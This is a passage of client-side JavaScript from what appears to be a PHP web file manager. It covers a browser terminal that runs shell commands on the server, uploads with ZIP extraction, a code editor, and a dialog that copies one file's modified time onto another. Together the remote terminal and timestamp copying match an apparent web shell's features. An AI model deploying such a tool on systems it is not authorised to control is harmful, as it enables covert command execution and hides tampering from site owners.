      function terminalAppend(html){const out=$('terminalOutput');if(!out)return;out.insertAdjacentHTML('beforeend',html);out.scrollTop=out.scrollHeight;}
      function clearTerminal(){const out=$('terminalOutput');if(out)out.innerHTML='';const i=$('terminalInput');if(i)i.focus();}
      async function runTerminalCommand(){
        const input=$('terminalInput');if(!input)return;const cmd=input.value.trim();if(!cmd){input.focus();return;}
        if(terminalHistory[terminalHistory.length-1]!==cmd)terminalHistory.push(cmd);terminalHistoryIndex=terminalHistory.length;
        terminalAppend('<div class="term-cmd">$ '+esc(cmd)+'</div>');input.value='';input.disabled=true;$('terminalRun').disabled=true;
        try{const d=await api('terminal',{cwd:terminalCwd,cwdMode:terminalCwdMode,command:cmd});if(d.output)terminalAppend('<div>'+esc(d.output)+'</div>');terminalAppend('<div class="'+(d.exitCode===0?'term-ok':'term-err')+'">['+(d.exitCode===0?'OK':'exit '+d.exitCode)+']</div>');if(d.cwd){terminalCwd=d.cwd;terminalCwdMode=d.cwdMode||'fs';$('terminalCwd').textContent=d.cwd;} }
        catch(e){terminalAppend('<div class="term-err">'+esc(e.message||'Terminal error')+'</div>');}
        finally{input.disabled=false;$('terminalRun').disabled=false;input.focus();}
      }
      function openNewFolder(){modal('Create New Folder','<div class="form-group"><label class="form-label">Folder Name</label><input id="fmName" class="form-control" autofocus placeholder="Enter folder name"></div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-success" onclick="createFolder()">Create</button>');setTimeout(()=>{ $('fmName').focus();$('fmName').onkeydown=e=>{if(e.key==='Enter')createFolder()}},30)}
      async function createFolder(){try{await api('mkdir',{dir:state.dir,name:$('fmName').value});closeModal();toast('Folder created');load()}catch(e){toast(e.message)}}
      function openNewFile(){modal('Create New File','<div class="form-group"><label class="form-label">File Name</label><input id="fmName" class="form-control" autofocus placeholder="index.php or README"></div><div class="form-text">File extension is optional. You can create <b>README</b>, <b>.env</b>, <b>index.php</b>, etc.</div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-success" onclick="createFile()">Create & Edit</button>');setTimeout(()=>{$('fmName').focus();$('fmName').onkeydown=e=>{if(e.key==='Enter')createFile()}},30)}
      async function createFile(){try{const n=$('fmName').value.trim();if(!n)throw Error('Enter a file name');if(/[\\\/\0]/.test(n)||n==='.'||n==='..')throw Error('Invalid file name');await api('createFile',{dir:state.dir,name:n});closeModal();await load();const p=(state.dir==='/'?'/':state.dir.replace(/\/$/,'')+'/')+n;editOne(p,n)}catch(e){toast(e.message)}}
      function openUpload(mode='files'){modal('Upload',`<div class="fm-upload-tabs"><button id="tabFiles" class="btn ${mode==='files'?'btn-primary':'btn-light'}" onclick="uploadTab('files')"><i class="fas fa-file-upload"></i> Files</button><button id="tabZip" class="btn ${mode==='zip'?'btn-primary':'btn-light'}" onclick="uploadTab('zip')"><i class="fas fa-file-archive"></i> ZIP & Unzip</button></div><div id="paneFiles" class="fm-upload-pane ${mode==='files'?'active':''}"><div class="fm-drop" id="dropFiles"><i class="fas fa-cloud-upload-alt" style="font-size:35px"></i><p>Select one or more files</p><input id="uploadFilesInput" type="file" multiple class="form-control"></div></div><div id="paneZip" class="fm-upload-pane ${mode==='zip'?'active':''}"><div class="fm-drop"><i class="fas fa-file-archive" style="font-size:35px"></i><p>Select a ZIP archive</p><input id="uploadZipInput" type="file" accept=".zip,application/zip" class="form-control"><label class="form-label" style="margin-top:12px">Extract into</label><input id="extractPath" class="form-control" value="${esc(state.dir)}"></div></div><div id="progressWrap" style="display:none;margin-top:15px"><div id="progressText" class="form-text"></div><div class="fm-progress"><div id="progressBar"></div></div></div>`,'<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-primary" id="uploadSubmit" onclick="submitUpload()">Upload</button>');}
      function uploadTab(t){$('paneFiles').classList.toggle('active',t==='files');$('paneZip').classList.toggle('active',t==='zip');$('tabFiles').className='btn '+(t==='files'?'btn-primary':'btn-light');$('tabZip').className='btn '+(t==='zip'?'btn-primary':'btn-light');$('uploadSubmit').dataset.mode=t}
      async function submitUpload(){
          const mode=$('paneZip').classList.contains('active')?'zip':'files';
          $('progressWrap').style.display='block';
      
          try{
              if(mode==='files'){
                  const fs=[...$('uploadFilesInput').files];
                  if(!fs.length)throw Error('Please select files');
      
                  const fd=new FormData();
                  fd.append('action','upload');
                  fd.append('dir',state.dir);
                  fs.forEach(f=>fd.append('file[]',f,f.name));
      
                  const r0=await new Promise((resolve,reject)=>{
                      const xhr=new XMLHttpRequest();
                      xhr.open('POST',location.href,true);
                      xhr.setRequestHeader('Cache-Control','no-cache');
                      xhr.upload.onprogress=function(e){
                          if(e.lengthComputable){
                              const percent=Math.round((e.loaded/e.total)*100);
                              setProgress(percent,'Uploading... '+percent+'% ('+formatBytes(e.loaded)+' / '+formatBytes(e.total)+')');
                          }
                      };
                      xhr.onload=function(){resolve(xhr);};
                      xhr.onerror=function(){reject(new Error('Upload connection failed'));};
                      xhr.onabort=function(){reject(new Error('Upload cancelled'));};
                      xhr.send(fd);
                  });
      
                  let r;
                  try{r=JSON.parse(r0.responseText);}catch(e){throw Error('Server returned an invalid response. Check PHP error log.');}
                  if(r.login){location.reload();return;}
                  if(!r.success)throw Error(r.error||'Upload failed');
                  setProgress(100,'Uploaded '+(r.count||fs.length)+' file(s)');
                  toast('Upload complete: '+(r.count||fs.length)+' file(s)');
                  closeModal();
                  load();
              }else{
                  const f=$('uploadZipInput').files[0];
                  if(!f)throw Error('Please select a ZIP');
                  const r=await api('uploadAndUnzip',{dir:state.dir,extractPath:$('extractPath').value},f);
                  setProgress(100,r.message||'Extracted');
                  toast(r.message||'Extracted');
                  closeModal();
                  load();
              }
          }catch(e){
              toast(e.message);
              $('progressText').textContent=e.message;
          }
      }
      
      function formatBytes(bytes){
          if(bytes===0)return '0 B';
          const units=['B','KB','MB','GB','TB'];
          const i=Math.floor(Math.log(bytes)/Math.log(1024));
          return (bytes/Math.pow(1024,i)).toFixed(i===0?0:2)+' '+units[i];
      }
      
      function setProgress(p,t){if($('progressBar'))$('progressBar').style.width=p+'%';if($('progressText'))$('progressText').textContent=t}
      function one(){const a=[...state.selected];if(a.length!==1){toast('Select exactly one item');return null}return a[0]}
      function editSelected(){const p=one();if(!p)return;const x=state.items.find(i=>i.fullPath===p);if(x?.type!=='file')return toast('Select a file');editOne(p,x.name)}
      async function editOne(p,n){
        try{
          const d=await api('edit',{path:p});
          editPathValue=p;editorBinary=!!d.binary;
          const rawContent=d.encoding==='base64'?(()=>{const b=atob(d.content||'');const bytes=new Uint8Array(b.length);for(let i=0;i<b.length;i++)bytes[i]=b.charCodeAt(i);try{return new TextDecoder('utf-8',{fatal:true}).decode(bytes);}catch(e){try{return new TextDecoder('windows-1252').decode(bytes);}catch(e2){let out='';for(let i=0;i<b.length;i++)out+=String.fromCharCode(b.charCodeAt(i));return out;}}})():(d.content||'');
          editorSaved=rawContent;
          editorIsHtml=['html','htm'].includes((n.split('.').pop()||'').toLowerCase());
          editorType='code';editorFallback=false;
          modal('Edit: '+n+' <span class="editor-ext-label">('+(n.split('.').pop()||'FILE').toUpperCase()+')</span>',
            '<div class="fm-editor-wrap" id="editorSurface"><textarea id="codeEditor" class="fm-fallback-editor"></textarea></div>',
            '<div><span id="editorStatus" class="form-text">Ready</span></div><div><button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-primary" onclick="saveEditor()"><i class="fas fa-save"></i> Save</button><button class="btn btn-success" onclick="saveEditor(true)"><i class="fas fa-save"></i> Save &amp; Close</button></div>',true);
          $('modalTitle').innerHTML='Edit File: <b>'+esc(n)+'</b> <span class="editor-ext-label">('+(n.split('.').pop()||'FILE').toUpperCase()+')</span>';
          const ta=$('codeEditor');ta.value=rawContent;
          setupEditorTools();
          const mode=editorMode(n);
          if(window.CodeMirror&&typeof CodeMirror.fromTextArea==='function'){
            try{
              editor=CodeMirror.fromTextArea(ta,{lineNumbers:true,matchBrackets:true,autoCloseBrackets:true,mode,theme:'default',lineWrapping:false,indentUnit:4,tabSize:4,extraKeys:{'Ctrl-F':function(){openAdvancedSearch(false);},'Cmd-F':function(){openAdvancedSearch(false);},'Ctrl-H':function(){openAdvancedSearch(true);},'Cmd-H':function(){openAdvancedSearch(true);}}});
              editor.setValue(rawContent);editorSaved=rawContent;editor.__saved=rawContent;editor.focus();
              $('editorStatus').textContent='Loaded '+n+(['png','jpg','jpeg','gif','webp','bmp','ico','avif'].includes((n.split('.').pop()||'').toLowerCase())?' • Binary image data':'');
            }catch(cmErr){
              editor=null;editorFallback=true;
              ta.value=d.content;ta.style.display='block';ta.classList.add('fm-fallback-editor');ta.focus();
              $('editorStatus').textContent='Loaded '+n+' • Fallback editor';
            }
          }else{
            editorFallback=true;ta.style.display='block';ta.classList.add('fm-fallback-editor');ta.focus();
            $('editorStatus').textContent='Loaded '+n+' • CodeMirror unavailable';
          }
        }catch(e){toast(e.message)}
      }
      function setupEditorTools(){
        const tools=$('editorHeaderTools');
        tools.style.display='flex';
        tools.innerHTML='<button type="button" class="btn btn-light editor-advanced-btn" id="editorModeToggle" onclick="toggleAdvancedEditor();return false;"><i class="fas fa-code"></i> Advanced Editor</button><button type="button" class="btn btn-light editor-format-btn" onclick="formatEditor();return false;"><i class="fas fa-paintbrush"></i> Format</button>';
      }
      function editorMode(n){const e=n.split('.').pop().toLowerCase();if(e==='php')return 'application/x-httpd-php';if(e==='html'||e==='htm'||e==='xml'||e==='svg')return 'xml';if(e==='css')return 'css';if(['js','mjs','ts','jsx','tsx','json'].includes(e))return 'javascript';if(['c','cpp','h','hpp','java'].includes(e))return 'text/x-csrc';return 'text/plain'}
      function advancedLanguageOptions(){return [['php','PHP'],['xml','HTML / XML'],['css','CSS'],['javascript','JavaScript'],['text/plain','Text'],['sql','SQL'],['python','Python'],['clike','C / C++ / Java']];}
      function setEditorLanguage(mode){
        const map={'php':'application/x-httpd-php','xml':'xml','css':'css','javascript':'javascript','text/plain':'text/plain','sql':'text/x-sql','python':'python','clike':'text/x-csrc'};
        if(editor&&typeof editor.setOption==='function')editor.setOption('mode',map[mode]||mode);
        const sel=$('advancedLanguage');if(sel)sel.value=mode;
      }
      function setEditorFontSize(px){
        px=parseInt(px,10)||13;
        const wrap=$('editorSurface');if(wrap)wrap.style.setProperty('--advanced-font-size',px+'px');
        const cm=editor&&typeof editor.getWrapperElement==='function'?editor.getWrapperElement():null;
        if(cm){cm.style.fontSize=px+'px';editor.refresh&&editor.refresh();}
        const ta=$('codeEditor');if(editorFallback&&ta)ta.style.fontSize=px+'px';
        const sel=$('advancedFontSize');if(sel)sel.value=String(px);
      }
      function closeAdvancedSearch(){
        const p=$('fmSearchPanel');if(p)p.remove();
        if(editor){editor.focus();}
      }
      function cmSearchValue(){const i=$('fmSearchInput');return i?i.value:''}
      function cmSearchFlags(){return {regex:!!$('fmSearchRegex')?.classList.contains('active'),caseSensitive:!!$('fmSearchCase')?.classList.contains('active')}}
      function cmSearchCursor(q,from){
        if(!editor||!q)return null;
        const f=cmSearchFlags();
        let needle=q;
        if(f.regex){try{needle=new RegExp(q,f.caseSensitive?'g':'gi')}catch(_){return null}}
        else if(!f.caseSensitive) needle=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');
        return editor.getSearchCursor(needle,from||editor.getCursor(),f.caseSensitive);
      }
      function cmSearchRun(dir){
        if(!editor)return;
        const q=cmSearchValue();if(!q){$('fmSearchCount')&&($('fmSearchCount').textContent='-  0 of 0');return;}
      
        // Count every match, but move to the NEXT/PREVIOUS match relative to the
        // current selection instead of restarting from the beginning on every Enter.
        let count=0,allMatches=[],cur=cmSearchCursor(q,{line:0,ch:0});
        while(cur&&cur.findNext()){allMatches.push({from:cur.from(),to:cur.to()});count++;}
      
        let found=null;
        if(count){
          const cursor=editor.getCursor();
          const currentIndex=allMatches.findIndex(m=>
            (m.from.line===editor.getCursor(true).line && m.from.ch===editor.getCursor(true).ch) &&
            (m.to.line===editor.getCursor(false).line && m.to.ch===editor.getCursor(false).ch)
          );
      
          if(dir<0){
            // Previous: choose the match immediately before the current selection.
            let idx=allMatches.length-1;
            if(currentIndex>=0) idx=(currentIndex-1+count)%count;
            else {
              idx=-1;
              for(let i=allMatches.length-1;i>=0;i--){
                const m=allMatches[i];
                if(m.to.line<cursor.line || (m.to.line===cursor.line && m.to.ch<cursor.ch)){idx=i;break;}
              }
              if(idx<0)idx=count-1;
            }
            found=allMatches[idx];
          }else{
            // Next: choose the match immediately after the current selection.
            let idx=0;
            if(currentIndex>=0) idx=(currentIndex+1)%count;
            else {
              idx=allMatches.findIndex(m=>m.from.line>cursor.line || (m.from.line===cursor.line && m.from.ch>=cursor.ch));
              if(idx<0)idx=0;
            }
            found=allMatches[idx];
          }
        }
      
        if(found){editor.setSelection(found.from,found.to);editor.scrollIntoView({from:found.from,to:found.to},100);}
        const c=$('fmSearchCount');if(c)c.textContent=(found?'1':'-')+'  '+count+' match'+(count===1?'':'es');
        const searchInput=$('fmSearchInput');
        if(searchInput){searchInput.focus();searchInput.setSelectionRange(searchInput.value.length,searchInput.value.length);}
      }
      function cmSearchReplace(all){
        if(!editor)return;const q=cmSearchValue(),r=$('fmReplaceInput')?.value??'';if(!q)return;
        const c=$('fmSearchCount');
        if(all){
          const f=cmSearchFlags();let cur=cmSearchCursor(q,{line:0,ch:0}),n=0;
          while(cur&&cur.findNext()){cur.replace(r);n++;}
          if(c){
            const remCur=cmSearchCursor(q,{line:0,ch:0});let remaining=0;
            while(remCur&&remCur.findNext())remaining++;
            c.textContent=remaining+' match'+(remaining===1?'':'es')+' • '+n+' replaced';
          }
        }else{
          // Replace the currently selected match when possible, then immediately
          // select the next match so Enter can be pressed repeatedly without
          // losing the position in the editor.
          let cur=null;
          const sel=editor.getSelection();
          if(sel && sel===q){
            const from=editor.getCursor(true),to=editor.getCursor(false);
            cur=cmSearchCursor(q,from);
            if(cur && cur.findNext()){
              const cf=cur.from(),ct=cur.to();
              if(cf.line!==from.line || cf.ch!==from.ch || ct.line!==to.line || ct.ch!==to.ch)cur=null;
            }
          }
          if(!cur){
            const pos=editor.getCursor();cur=cmSearchCursor(q,pos);
            if(cur&&!cur.findNext())cur=cmSearchCursor(q,{line:0,ch:0});
          }
          if(cur){
            cur.replace(r);
            let next=cmSearchCursor(q,cur.from());
            if(next&&next.findNext()){
              const nf=next.from(),nt=next.to();
              if(nf.line===cur.from().line&&nf.ch===cur.from().ch){
                if(next.findNext()){editor.setSelection(next.from(),next.to());editor.scrollIntoView({from:next.from(),to:next.to},100);}
                else editor.setSelection(cur.from(),cur.from());
              }else{
                editor.setSelection(nf,nt);editor.scrollIntoView({from:nf,to:nt},100);
              }
            }else{
              // Wrap around to the first remaining match.
              const first=cmSearchCursor(q,{line:0,ch:0});
              if(first&&first.findNext()){editor.setSelection(first.from(),first.to());editor.scrollIntoView({from:first.from(),to:first.to},100);}
            }
            if(c){
              const remCur=cmSearchCursor(q,{line:0,ch:0});let remaining=0;
              while(remCur&&remCur.findNext())remaining++;
              c.textContent=remaining+' match'+(remaining===1?'':'es')+' • 1 replaced';
            }
          }else{
            if(c)c.textContent='0 matches • 0 replaced';
          }
        }
        const replaceInput=$('fmReplaceInput');
        if(replaceInput){replaceInput.focus();replaceInput.setSelectionRange(replaceInput.value.length,replaceInput.value.length);}
      }
      function openAdvancedSearch(replace){
        if(!editor)return;
        let p=$('fmSearchPanel');
        if(!p){
          p=document.createElement('div');p.id='fmSearchPanel';p.className='fm-cm-search-panel';
          p.innerHTML='<div class="fm-cm-search-row"><input id="fmSearchInput" class="fm-cm-find" placeholder="Search for" autocomplete="off"><button class="fm-cm-btn fm-cm-search-action" id="fmSearchGo" title="Search"><i class="fas fa-search"></i></button><button class="fm-cm-btn" id="fmPrev" title="Previous">‹</button><button class="fm-cm-btn" id="fmNext" title="Next">›</button><button class="fm-cm-btn" id="fmAll">All</button><button class="fm-cm-btn fm-cm-close" id="fmClose" title="Close">×</button></div>'+
            '<div class="fm-cm-search-row" id="fmReplaceRow"><input id="fmReplaceInput" class="fm-cm-replace" placeholder="Replace with" autocomplete="off"><button class="fm-cm-btn" id="fmReplace">Replace</button><button class="fm-cm-btn" id="fmReplaceAll">All</button></div>'+
            '<div class="fm-cm-status"><span id="fmSearchCount" class="fm-cm-count">-  0 of 0</span><button class="fm-cm-toggle" id="fmSearchRegex" title="Regular expression">.*</button><button class="fm-cm-toggle" id="fmSearchCase" title="Match case">Aa</button><button class="fm-cm-toggle" id="fmSearchWord" title="Whole word">\\b</button><button class="fm-cm-toggle fm-cm-close" id="fmClose2">×</button></div>';
          $('editorSurface').appendChild(p);
          // Do not search while typing. The query is executed only when the user clicks Search/All, or presses Enter.
          $('fmSearchInput').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();cmSearchRun(e.shiftKey?-1:1)}else if(e.key==='Escape'){e.preventDefault();closeAdvancedSearch()}});
          $('fmReplaceInput').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();cmSearchReplace(false)}else if(e.key==='Escape'){e.preventDefault();closeAdvancedSearch()}});
          $('fmSearchGo').onclick=()=>cmSearchRun(1);
          $('fmPrev').onclick=()=>cmSearchRun(-1);$('fmNext').onclick=()=>cmSearchRun(1);
          $('fmAll').onclick=()=>cmSearchRun(1);$('fmReplace').onclick=()=>cmSearchReplace(false);$('fmReplaceAll').onclick=()=>cmSearchReplace(true);
          $('fmClose').onclick=closeAdvancedSearch;$('fmClose2').onclick=closeAdvancedSearch;
          ['fmSearchRegex','fmSearchCase','fmSearchWord'].forEach(id=>$(id).onclick=()=>{$(id).classList.toggle('active');cmSearchRun(1)});
        }
        $('fmReplaceRow').style.display=replace?'flex':'none';
        const input=$('fmSearchInput');input.focus();
        const sel=editor.getSelection();if(sel && sel.indexOf('\n')<0 && sel.length<500)input.value=sel;
        if(input.value) cmSearchRun(1);
      }
      function advancedSearch(){openAdvancedSearch(false)}
      function advancedReplace(){openAdvancedSearch(true)}
      document.addEventListener('keydown',function(e){
        if(!editor||!$('editorSurface')||!$('editorSurface').classList.contains('advanced-mode')||!$('modal').classList.contains('show'))return;
        const inEditor=e.target.closest&&e.target.closest('.CodeMirror');
        if(!inEditor)return;
        if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='f'){e.preventDefault();e.stopImmediatePropagation();openAdvancedSearch(false);return false;}
        if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='h'){e.preventDefault();e.stopImmediatePropagation();openAdvancedSearch(true);return false;}
      },true);
      function findInEditor(q){
        q=String(q||'');if(!q)return;
        if(editor&&typeof editor.getCursor==='function'){
          const text=editor.getValue(),cursor=editor.getCursor(),start=editor.indexFromPos(cursor);let at=text.indexOf(q,start);if(at<0)at=text.indexOf(q,0);if(at<0)return toast('Text not found');
          const from=editor.posFromIndex(at),to=editor.posFromIndex(at+q.length);editor.setSelection(from,to);editor.scrollIntoView({from:from,to:to},120);editor.focus();return;
        }
        const ta=$('codeEditor');if(!ta)return;
        const text=ta.value||'',start=ta.selectionStart||0;let at=text.indexOf(q,start);if(at<0)at=text.indexOf(q,0);if(at<0)return toast('Text not found');
        ta.focus();ta.setSelectionRange(at,at+q.length);
      }
      function advancedBackup(){
        const content=getEditorContent();const name=(editPathValue.split('/').pop()||'file')+'.bak';
        const blob=new Blob([content],{type:'text/plain;charset=utf-8'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(a.href),500);toast('Backup downloaded');
      }
      function advancedUndo(){if(editor&&typeof editor.undo==='function')editor.undo();else document.execCommand('undo');}
      function advancedRedo(){if(editor&&typeof editor.redo==='function')editor.redo();else document.execCommand('redo');}
      function advancedToolbarHtml(){
        const langOpts=advancedLanguageOptions().map(o=>'<option value="'+o[0]+'">'+o[1]+'</option>').join('');
        return '<div class="fm-advanced-toolbar" id="advancedToolbar">'+
          '<div class="fm-advanced-tools-left">'+
            '<button type="button" class="fm-adv-icon" title="Fullscreen" onclick="toggleEditorFullscreen()"><i class="fas fa-expand"></i></button>'+
            '<button type="button" class="fm-adv-icon" title="Search" onclick="advancedSearch()"><i class="fas fa-search"></i></button>'+
            '<button type="button" class="fm-adv-icon" title="Undo" onclick="advancedUndo()"><i class="fas fa-rotate-left"></i></button>'+
            '<button type="button" class="fm-adv-icon" title="Redo" onclick="advancedRedo()"><i class="fas fa-rotate-right"></i></button>'+
            '<button type="button" class="fm-adv-icon" title="Toggle line wrapping" onclick="toggleEditorWrap()"><i class="fas fa-align-left"></i></button>'+
            '<span class="fm-adv-divider"></span>'+
            '<select id="advancedLanguage" class="fm-adv-select" onchange="setEditorLanguage(this.value)">'+langOpts+'</select>'+
            '<select id="advancedTheme" class="fm-adv-select fm-adv-theme" onchange="setAdvancedTheme(this.value)"><option value="textmate">TextMate</option><option value="dark">Dark</option></select>'+
            '<select id="advancedFontSize" class="fm-adv-select fm-adv-size" onchange="setEditorFontSize(this.value)"><option value="11">11</option><option value="12">12</option><option value="13" selected>13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="18">18</option></select>'+
          '</div>'+
          '<div class="fm-advanced-tools-right">'+
            '<button type="button" class="fm-adv-action" onclick="advancedBackup()"><i class="fas fa-database"></i> Back Up</button>'+
          '</div>'+
        '</div>';
      }
      function toggleAdvancedEditor(){
        const surface=$('editorSurface');if(!surface)return;
        const btn=$('editorModeToggle');const existing=surface.querySelector('.fm-advanced-toolbar');
        if(existing){
          existing.remove();surface.classList.remove('advanced-mode');
          if(editor&&typeof editor.setOption==='function'){editor.setOption('lineWrapping',false);editor.getWrapperElement().style.fontSize='13px';editor.refresh();}
          const ta=$('codeEditor');if(editorFallback&&ta){ta.style.fontSize='13px';ta.style.background='#2b2b2b';ta.style.color='#e8e8e8';}
          if(btn)btn.innerHTML='<i class="fas fa-code"></i> Advanced Editor';$('editorStatus').textContent='Normal Editor';return;
        }
        surface.classList.add('advanced-mode');surface.insertAdjacentHTML('afterbegin',advancedToolbarHtml());
        const ext=(editPathValue.split('.').pop()||'').toLowerCase();const langMap={php:'php',html:'xml',htm:'xml',xml:'xml',svg:'xml',css:'css',js:'javascript',mjs:'javascript',ts:'javascript',tsx:'javascript',jsx:'javascript',json:'javascript',sql:'sql',py:'python',rb:'clike',go:'clike',java:'clike',c:'clike',cpp:'clike',h:'clike',hpp:'clike'};
        const sel=$('advancedLanguage');if(sel)sel.value=langMap[ext]||'text/plain';
        setEditorFontSize(13);setAdvancedTheme('textmate');
        if(editor&&typeof editor.refresh==='function'){editor.refresh();editor.focus();}
        else{$('codeEditor')?.focus();}
        if(btn)btn.innerHTML='<i class="fas fa-i-cursor"></i> Normal Editor';$('editorStatus').textContent='Advanced Editor';
      }
      function toggleEditorWrap(){
        if(editor&&typeof editor.getOption==='function'){editor.setOption('lineWrapping',!editor.getOption('lineWrapping'));editor.refresh();return;}
        const ta=$('codeEditor');if(ta)ta.style.whiteSpace=ta.style.whiteSpace==='pre-wrap'?'pre':'pre-wrap';
      }
      function setAdvancedTheme(theme){
        const wrap=$('editorSurface');if(wrap)wrap.setAttribute('data-advanced-theme',theme);
        if(editor&&editor.getWrapperElement){editor.getWrapperElement().classList.toggle('fm-adv-dark',theme==='dark');editor.refresh&&editor.refresh();}
        const ta=$('codeEditor');if(editorFallback&&ta){ta.style.background=theme==='dark'?'#202124':'#fff';ta.style.color=theme==='dark'?'#e7e7e7':'#222';ta.style.caretColor=theme==='dark'?'#fff':'#222';}
      }
      function toggleEditorFullscreen(){
        const modalEl=$('modal'),content=$('modalContent');if(!modalEl||!content)return;
        const full=content.classList.toggle('fm-editor-fullscreen');modalEl.classList.toggle('fm-editor-modal-fullscreen',full);setTimeout(()=>editor&&editor.refresh&&editor.refresh(),50);
      }
      function formatEditor(){
        let content=getEditorContent();if(!editorIsHtml)return toast('Format is available for HTML files');
        try{
          if(typeof html_beautify==='function')content=html_beautify(content,{indent_size:2,wrap_line_length:0,preserve_newlines:true,indent_inner_html:true,extra_liners:'head,body,/html'});else content=content.replace(/>\s*</g,'>\n<');
          if(editor&&typeof editor.setValue==='function')editor.setValue(content);else if($('codeEditor'))$('codeEditor').value=content;
          $('editorStatus').textContent='Formatted';toast('HTML formatted');
        }catch(e){toast('Format failed: '+e.message)}
      }
      async function saveEditor(closeAfter=false){if(!editPathValue)return;try{const content=getEditorContent();let payload;if(editorBinary){payload=btoa(Array.from(content,ch=>String.fromCharCode(ch.charCodeAt(0)&255)).join(''));}else{payload=btoa(unescape(encodeURIComponent(content)));}await api('save',{path:editPathValue,content:payload,encoding:'base64',binary:editorBinary?'1':'0'});editorSaved=content;if(editor)editor.__saved=content;$('editorStatus').textContent='Saved successfully';toast('Saved');await load();if(closeAfter)setTimeout(()=>closeModal(),150);}catch(e){toast(e.message)}}
      async function createZip(p,n){try{const r=await api('createZip',{path:p,name:n+'.zip'});toast(r.message||'ZIP created');await load();}catch(e){toast(e.message||'ZIP failed');}}
      function downloadZip(p){const f=document.createElement('form');f.method='POST';f.action=location.href;[['action','downloadZip'],['path',p]].forEach(([k,v])=>{const i=document.createElement('input');i.type='hidden';i.name=k;i.value=v;f.appendChild(i)});document.body.appendChild(f);f.submit();f.remove()}
      function downloadOne(p){const f=document.createElement('form');f.method='POST';f.action=location.href;[['action','download'],['path',p]].forEach(([k,v])=>{const i=document.createElement('input');i.type='hidden';i.name=k;i.value=v;f.appendChild(i)});document.body.appendChild(f);f.submit();f.remove()}
      function downloadSelected(){const p=one();if(p)downloadOne(p)}
      function renameOne(p,n){modal('Rename','<div class="form-group"><label class="form-label">New Name</label><input id="fmName" class="form-control" value="'+esc(n)+'" autofocus></div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-primary" onclick="doRename('+esc(js(p))+')">Rename</button>');setTimeout(()=>{$('fmName').focus();$('fmName').select();$('fmName').onkeydown=e=>{if(e.key==='Enter')doRename(p)}},30)}
      async function doRename(p){try{await api('rename',{oldPath:p,newName:$('fmName').value});closeModal();state.selected.clear();load()}catch(e){toast(e.message)}}
      function touchOne(p,n,t,m){
        const item=state.items.find(i=>i.fullPath===p)||{};
        let value=m||item.modifiedInput||'';
        if(!value&&item.modified){const d=new Date(item.modified*1000);const pad=v=>String(v).padStart(2,'0');value=d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+'T'+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());}
        modal('Change Modified Time: '+esc(n),'<div class="form-group"><label class="form-label">Date &amp; Time</label><input id="fmTouchDate" class="form-control" type="datetime-local" step="1" value="'+esc(value)+'"></div><div class="fm-touch-tools"><button type="button" class="btn btn-light" onclick="pasteModifiedDate()"><i class="fas fa-paste"></i> Paste copied date</button><button type="button" class="btn btn-light" onclick="copyTouchDate()"><i class="fas fa-copy"></i> Copy date</button></div><div class="form-text">Format: <b>YYYY-MM-DD HH:MM:SS</b> &nbsp;•&nbsp; Copy from another file, then Paste here.</div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-primary" onclick="doTouch('+esc(js(p))+')"><i class="fas fa-clock"></i> Touch</button>');
        setTimeout(()=>{$('fmTouchDate')?.focus();$('fmTouchDate')?.select();$('fmTouchDate')?.addEventListener('keydown',e=>{if(e.key==='Enter')doTouch(p)})},30);
      }
      function normalizeModifiedDate(v){
        v=String(v||'').trim();
        if(!v)return '';
        v=v.replace('T',' ');
        if(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(v))v+=':00';
        return v;
      }
      async function copyTextCompat(text){
        text=String(text||'');
        if(!text)return false;
        try{if(navigator.clipboard&&window.isSecureContext){await navigator.clipboard.writeText(text);return true;}}catch(e){}
        try{const ta=document.createElement('textarea');ta.value=text;ta.setAttribute('readonly','');ta.style.position='fixed';ta.style.left='-9999px';document.body.appendChild(ta);ta.select();const ok=document.execCommand('copy');ta.remove();return ok;}catch(e){return false;}
      }
      async function copyModifiedDate(v){
        const value=normalizeModifiedDate(v);
        if(!value)return toast('Tidak ada tanggal untuk disalin.');
        let ok=await copyTextCompat(value);
        try{window.__fmCopiedModifiedDate=value;localStorage.setItem('fmCopiedModifiedDate',value);}catch(e){window.__fmCopiedModifiedDate=value;}
        if(ok){toast('✓ Date copied: '+value);}
        else {toast('✓ Date saved: '+value+' (browser clipboard unavailable)');}
        return ok;
      }
      async function pasteModifiedDate(){
        let value='';
        try{if(navigator.clipboard&&window.isSecureContext&&typeof navigator.clipboard.readText==='function')value=await navigator.clipboard.readText();}catch(e){}
        value=normalizeModifiedDate(value);
        if(!value){try{value=normalizeModifiedDate(localStorage.getItem('fmCopiedModifiedDate')||'');}catch(e){}}
        if(!value)value=normalizeModifiedDate(window.__fmCopiedModifiedDate||'');
        if(!value)return toast('Belum ada tanggal yang disalin.');
        if(!/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(value))return toast('Copied date is invalid.');
        const input=$('fmTouchDate');
        if(input){input.value=value.replace(' ','T');input.dispatchEvent(new Event('input',{bubbles:true}));}
        toast('✓ Date pasted: '+value);
      }
      async function copyTouchDate(){
        const input=$('fmTouchDate');
        if(!input||!input.value)return toast('Tidak ada tanggal untuk disalin.');
        await copyModifiedDate(input.value.replace('T',' '));
      }
      async function doTouch(p){try{const input=$('fmTouchDate');if(!input||!input.value)throw Error('Date and time are required.');const datetime=input.value.replace('T',' ');const r=await api('touch',{path:p,datetime});closeModal();toast('Modified time changed to '+(r.modifiedText||datetime));await load();}catch(e){toast(e.message||'Touch failed')}}
      function chmodOne(p,n,t){
        const defaultMode=t==='folder'?'0755':'0644';
